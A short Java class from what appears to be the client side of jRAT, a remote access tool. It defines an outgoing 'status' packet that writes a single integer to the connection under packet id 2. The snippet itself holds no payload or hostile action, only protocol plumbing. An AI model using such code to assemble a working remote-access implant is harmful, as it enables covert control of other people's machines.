package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet2Status extends AbstractOutgoingPacket {

	private int status;

	public Packet2Status(int status) {
		this.status = status;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeInt(status);
	}

	@Override
	public short getPacketId() {
		return (byte) 2;
	}

}
